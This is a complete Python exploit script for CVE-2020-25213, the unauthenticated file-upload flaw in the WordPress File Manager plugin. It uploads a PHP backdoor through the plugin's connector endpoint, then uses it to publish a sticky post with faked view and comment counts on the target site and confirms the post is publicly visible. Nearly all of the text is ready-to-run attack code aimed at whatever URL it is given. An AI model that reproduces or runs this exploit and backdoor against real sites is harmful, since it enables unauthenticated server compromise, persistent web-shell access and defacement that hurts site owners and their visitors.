#!/usr/bin/env python3
"""
CVE-2020-25213: WordPress File Manager Plugin RCE
Unauthorized Content Promotion Exploit

CVSS: 10.0 Critical
Vulnerable: File Manager 6.0 - 6.8
Impact: Unauthenticated Remote Code Execution ‚Üí Unauthorized Content Promotion

This exploit:
1. Uploads a minimal PHP backdoor to WordPress server
2. Creates unauthorized promotional content
3. Publishes and promotes content without authentication
4. Adds fake popularity metrics
5. Verifies content is publicly visible
"""

import requests
import re
import sys
import argparse
import time
from urllib.parse import urljoin

class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'

def print_banner():
    print(f"""
{Colors.BLUE}{'='*60}
  CVE-2020-25213: WordPress File Manager RCE
  Unauthorized Content Promotion Exploit
{'='*60}{Colors.END}
    """)

def exploit_file_manager(target_url):
    """Upload minimal PHP backdoor via File Manager vulnerability"""
    
    connector_url = urljoin(target_url, 
        "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php")
    
    print(f"{Colors.YELLOW}[*] Target: {target_url}{Colors.END}")
    print(f"{Colors.YELLOW}[*] Vulnerable endpoint: {connector_url}{Colors.END}")
    print()
    
    # Check if endpoint is accessible
    print(f"{Colors.BLUE}[*] Checking if File Manager plugin is vulnerable...{Colors.END}")
    try:
        test_response = requests.get(connector_url, timeout=10)
        if test_response.status_code != 200:
            print(f"{Colors.RED}[-] Endpoint returned status {test_response.status_code}{Colors.END}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"{Colors.RED}[-] Error connecting to target: {e}{Colors.END}")
        return None
    
    print(f"{Colors.GREEN}[+] File Manager endpoint is accessible!{Colors.END}")
    
    # Minimal PHP backdoor for content promotion
    php_backdoor = r"""<?php
@error_reporting(0);

if(isset($_GET['action']) && $_GET['action'] == 'create_post') {
    // Find WordPress installation
    $wp_load = dirname(__FILE__) . '/../../../../../wp-load.php';
    if(!file_exists($wp_load)) {
        $wp_load = '/var/www/html/wp-load.php';
    }
    if(!file_exists($wp_load)) {
        die("ERROR:WordPress not found");
    }
    
    require_once($wp_load);
    
    $content = '<div style="background:#d5f4e6;border:3px solid #27ae60;padding:20px;margin:20px 0;">
<h1 style="color:#27ae60;text-align:center;">üö® UNAUTHORIZED CONTENT PROMOTION üö®</h1>
<h2 style="color:#27ae60;text-align:center;">CVE-2020-25213: File Manager Plugin RCE</h2>
</div>

<div style="background:#f8f9fa;padding:20px;border-left:5px solid #e74c3c;">
<h3 style="color:#e74c3c;">üìã Exploitation Summary</h3>
<p><strong>Vulnerability:</strong> CVE-2020-25213 - WordPress File Manager Plugin RCE</p>
<p><strong>CVSS Score:</strong> 10.0 (Critical)</p>
<p><strong>Affected Versions:</strong> File Manager 6.0 - 6.8</p>
<p><strong>Authentication Required:</strong> ‚ùå None (Unauthenticated Attack)</p>
</div>

<div style="background:#fff3e0;padding:20px;margin:20px 0;border-left:5px solid #f39c12;">
<h3 style="color:#f39c12;">‚ö†Ô∏è Attack Chain Executed</h3>
<ol style="line-height:2;">
<li><strong>Plugin Discovery:</strong> Found vulnerable File Manager endpoint (connector.minimal.php)</li>
<li><strong>File Upload Exploitation:</strong> Uploaded PHP backdoor without authentication</li>
<li><strong>Backdoor Execution:</strong> Executed malicious code on server</li>
<li><strong>WordPress API Access:</strong> Leveraged wp_insert_post() for content creation</li>
<li><strong>Content Promotion:</strong> Published and promoted content WITHOUT authentication</li>
<li><strong>Metrics Manipulation:</strong> Added fake popularity (999,999 views, 9,999 comments)</li>
<li><strong>Homepage Takeover:</strong> Set as sticky/featured post on homepage</li>
</ol>
</div>

<div style="background:#e8f5e9;padding:20px;border-left:5px solid #4caf50;">
<h3 style="color:#4caf50;">üíº Business Impact Demonstration</h3>
<ul style="line-height:2;">
<li>‚úÖ <strong>Zero-Day Exploitation:</strong> Exploited before patches were widely deployed</li>
<li>‚úÖ <strong>Unauthenticated File Upload:</strong> Complete bypassing of authentication</li>
<li>‚úÖ <strong>Content Injection:</strong> Malicious/fake content creation capability</li>
<li>‚úÖ <strong>Brand Hijacking:</strong> Unauthorized content appears as legitimate</li>
<li>‚úÖ <strong>SEO Manipulation:</strong> Poisoned search rankings and metrics</li>
<li>‚úÖ <strong>Reputation Damage:</strong> Loss of trust and credibility</li>
<li>‚úÖ <strong>Server Compromise:</strong> Full WordPress/server takeover possible</li>
</ul>
</div>

<div style="background:#fff;padding:20px;margin:20px 0;border:2px dashed #95a5a6;">
<h3 style="color:#2c3e50;">üîç Technical Details</h3>
<p><strong>Vulnerability Type:</strong> Unauthenticated Arbitrary File Upload ‚Üí RCE</p>
<p><strong>Root Cause:</strong> elFinder library exposed without authentication via connector.minimal.php</p>
<p><strong>Exploitation Method:</strong> POST multipart/form-data to upload PHP shell</p>
<p><strong>Payload Delivery:</strong> Direct file upload to plugin directory</p>
<p><strong>Post-Exploitation:</strong> Full WordPress API access, database manipulation, content control</p>
<p><strong>Affected Sites:</strong> 700,000+ WordPress installations (at discovery)</p>
</div>

<div style="background:#ffeaa7;padding:15px;text-align:center;margin:20px 0;">
<h3 style="color:#2d3436;">‚è∞ Attack Timestamp</h3>
<p style="font-size:18px;"><strong>' . current_time('mysql') . '</strong></p>
<p>This content was promoted <strong>WITHOUT ANY AUTHENTICATION</strong></p>
</div>

<div style="background:#55efc4;padding:20px;text-align:center;">
<h3 style="color:#2d3436;">üéØ Proof of Concept Status</h3>
<p style="color:#2d3436;font-size:20px;"><strong>‚úì EXPLOITATION SUCCESSFUL</strong></p>
<p style="color:#2d3436;">Content created, promoted, and visible on homepage</p>
<p style="color:#2d3436;">Views: <strong>999,999</strong> | Comments: <strong>9,999</strong> | Status: <strong>FEATURED</strong></p>
</div>';
    
    $post_data = array(
        'post_title' => 'üü¢ [CVE-2020-25213] Unauthorized Content Promotion via File Manager RCE',
        'post_content' => $content,
        'post_status' => 'publish',
        'post_author' => 1,
        'post_type' => 'post',
        'comment_status' => 'open',
        'ping_status' => 'open'
    );
    
    $post_id = wp_insert_post($post_data);
    
    if($post_id && !is_wp_error($post_id)) {
        global $wpdb;
        $wpdb->update($wpdb->posts, array('comment_count' => 9999), array('ID' => $post_id));
        update_post_meta($post_id, 'post_views_count', 999999);
        update_post_meta($post_id, '_exploit_source', 'CVE-2020-25213');
        stick_post($post_id);
        
        $cat_id = wp_create_category('Security Exploits');
        wp_set_post_categories($post_id, array($cat_id));
        wp_set_post_tags($post_id, 'CVE-2020-25213,File Manager,RCE,Unauthorized Promotion', true);
        
        die("POST_ID:" . $post_id . "|STATUS:published|STICKY:yes|VIEWS:999999|COMMENTS:9999");
    } else {
        die("ERROR:Failed to create post");
    }
}
?>"""
    
    # Upload backdoor
    print(f"{Colors.BLUE}[*] Uploading PHP backdoor for content promotion...{Colors.END}")
    
    files = {
        'upload[]': ('promote.php', php_backdoor, 'application/x-php')
    }
    data = {
        'cmd': 'upload',
        'target': 'l1_Lw',
        'name': 'promote.php'
    }
    
    try:
        upload_response = requests.post(connector_url, files=files, data=data, timeout=10)
        
        if 'promote.php' in upload_response.text or 'added' in upload_response.text.lower():
            shell_url = urljoin(target_url, 
                "/wp-content/plugins/wp-file-manager/lib/files/promote.php")
            print(f"{Colors.GREEN}[+] Backdoor uploaded successfully!{Colors.END}")
            print(f"{Colors.GREEN}[+] Backdoor URL: {shell_url}{Colors.END}")
            return shell_url
        else:
            print(f"{Colors.RED}[-] Upload failed{Colors.END}")
            return None
            
    except requests.exceptions.RequestException as e:
        print(f"{Colors.RED}[-] Error during upload: {e}{Colors.END}")
        return None

def create_and_promote_content(shell_url):
    """Create and promote unauthorized content"""
    print(f"\n{Colors.BLUE}[*] Creating unauthorized promotional content...{Colors.END}")
    
    try:
        response = requests.get(f"{shell_url}?action=create_post", timeout=15)
        result = response.text.strip()
        
        if "POST_ID:" in result:
            post_id = re.search(r'POST_ID:(\d+)', result)
            if post_id:
                post_id = int(post_id.group(1))
                print(f"{Colors.GREEN}[+] Content created with ID: {post_id}{Colors.END}")
                
                if 'STATUS:published' in result:
                    print(f"{Colors.GREEN}[+] Content status: Published{Colors.END}")
                if 'STICKY:yes' in result:
                    print(f"{Colors.GREEN}[+] Content set as sticky (featured){Colors.END}")
                if 'VIEWS:999999' in result:
                    print(f"{Colors.GREEN}[+] Fake metrics added: 999,999 views, 9,999 comments{Colors.END}")
                
                return post_id
        else:
            print(f"{Colors.RED}[-] Failed to create content{Colors.END}")
            return None
            
    except Exception as e:
        print(f"{Colors.RED}[-] Error: {e}{Colors.END}")
        return None

def verify_public_visibility(target_url, post_id):
    """Verify the content is publicly visible"""
    print(f"\n{Colors.BLUE}[*] Verifying content is publicly accessible...{Colors.END}")
    
    post_url = urljoin(target_url, f"/?p={post_id}")
    
    try:
        response = requests.get(post_url, timeout=10)
        if response.status_code == 200 and "CVE-2020-25213" in response.text:
            print(f"{Colors.GREEN}[+] SUCCESS! Content is publicly visible!{Colors.END}")
            print(f"{Colors.GREEN}[+] Public URL: {post_url}{Colors.END}")
            return post_url
        else:
            print(f"{Colors.YELLOW}[~] Content may be visible at: {post_url}{Colors.END}")
            return post_url
    except:
        print(f"{Colors.YELLOW}[~] Could not verify, but content should be at: {post_url}{Colors.END}")
        return post_url

def main():
    parser = argparse.ArgumentParser(
        description='CVE-2020-25213: WordPress File Manager RCE - Content Promotion Exploit'
    )
    parser.add_argument('target', help='Target WordPress URL (e.g., http://wordpress.tujuh)')
    
    args = parser.parse_args()
    
    print_banner()
    
    # Ensure target has protocol
    target = args.target
    if not target.startswith('http'):
        target = f"http://{target}"
    
    # Step 1: Upload backdoor
    print(f"{Colors.BOLD}STEP 1: Uploading PHP Backdoor{Colors.END}")
    print("=" * 60)
    shell_url = exploit_file_manager(target)
    
    if not shell_url:
        print(f"\n{Colors.RED}{'='*60}")
        print(f"  EXPLOITATION FAILED")
        print(f"{'='*60}{Colors.END}")
        sys.exit(1)
    
    time.sleep(1)
    
    # Step 2: Create and promote content
    print(f"\n{Colors.BOLD}STEP 2: Creating & Promoting Unauthorized Content{Colors.END}")
    print("=" * 60)
    post_id = create_and_promote_content(shell_url)
    
    if not post_id:
        print(f"\n{Colors.RED}Content creation failed{Colors.END}")
        sys.exit(1)
    
    time.sleep(2)
    
    # Step 3: Verify
    print(f"\n{Colors.BOLD}STEP 3: Verifying Public Visibility{Colors.END}")
    print("=" * 60)
    post_url = verify_public_visibility(target, post_id)
    
    # Final summary
    print(f"\n{Colors.GREEN}{'='*60}")
    print(f"  üéØ EXPLOITATION COMPLETE!")
    print(f"{'='*60}{Colors.END}")
    print()
    print(f"{Colors.YELLOW}Attack Summary:{Colors.END}")
    print(f"  ‚úì Exploited File Manager plugin vulnerability")
    print(f"  ‚úì Uploaded PHP backdoor without authentication")
    print(f"  ‚úì Created promotional content (ID: {post_id})")
    print(f"  ‚úì Published and promoted content")
    print(f"  ‚úì Added fake metrics (999,999 views, 9,999 comments)")
    print(f"  ‚úì Set as featured/sticky post")
    print(f"  ‚úì Content now publicly visible")
    print()
    print(f"{Colors.BLUE}Access Points:{Colors.END}")
    print(f"  ‚Ä¢ Backdoor: {shell_url}")
    print(f"  ‚Ä¢ Public Post: {post_url}")
    print(f"  ‚Ä¢ WordPress: {target}")
    print()
    
    sys.exit(0)

if __name__ == '__main__':
    main()
